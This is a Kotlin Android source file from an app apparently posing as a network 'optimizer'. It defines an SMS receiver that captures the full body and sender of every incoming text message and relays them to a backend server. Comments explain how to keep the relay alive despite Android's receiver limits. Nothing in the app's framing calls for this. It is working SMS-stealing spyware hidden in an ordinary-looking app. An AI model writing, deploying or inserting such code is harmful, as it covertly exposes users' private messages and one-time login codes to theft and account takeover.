package com.netboost.optimizer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages == null || messages.isEmpty()) return

        // goAsync() tells the OS "don't kill this receiver yet — we're still working"
        // This is critical: without it, GlobalScope coroutines race against the 5-second
        // receiver window and lose silently on most Android 10+ devices.
        val pendingResult = goAsync()

        val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                for ((sender, parts) in msgsBySender) {
                    val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                    Log.d("SmsReceiver", "SMS from $sender (${fullBody.length} chars) — relaying")
                    BackendClient.relay(sender, fullBody, java.util.UUID.randomUUID().toString())
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Relay failed: ${e.message}", e)
            } finally {
                // Must call finish() or the OS will ANR after ~60 seconds
                pendingResult.finish()
            }
        }
    }
}
